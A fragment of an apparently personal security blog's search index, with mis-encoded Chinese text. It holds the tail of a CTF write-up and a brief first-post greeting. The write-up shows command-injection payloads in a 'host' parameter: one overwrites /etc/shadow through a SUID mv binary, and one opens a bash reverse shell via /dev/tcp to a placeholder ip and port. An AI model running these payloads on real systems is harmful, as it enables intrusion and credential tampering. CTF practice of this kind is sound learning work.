class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹ï¼šsuid mvææƒ</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€é¢˜æ¯”èµ›æ—¶æ²¡çœ‹å°±æ‡’å¾—å†™äº†ï¼</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpååºåˆ—åŒ– </tag>
            
            <tag> suidææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°çš„å¼€å§‹</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>æ—©å°±æƒ³å¼„ä¸ªblogè®°å½•å­¦ä¹ äº†ï¼Œä½†æ˜¯ä¹‹å‰ä¸€ç›´è§‰å¾—éº»çƒ¦å°±ä¸€ç›´åœ¨csdnå‘</p><p><a href="https://blog.csdn.net/2403_88003384?spm=1000.2115.3001.5343">rufeii_-CSDNåšå®¢</a></p><p>ä½†æ˜¯csdnè¿™bydå¹¿å‘Šå¤ªå¤šäº†ï¼Œå¦å¤–å°±æ˜¯å®ƒçš„æœç´¢æ£€ç´¢æœ‰é—®é¢˜ï¼Œäºæ˜¯å°±è§‰å¾—ä¸èƒ½å†æ‹–äº†ï¼</p><p>è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œæ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹å§ï¼Œå¦å¤–å°±æ˜¯æ…¢æ…¢åœ°å­¦ï¼Œä¸è¦æ€¥äºæ±‚æˆï¼</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
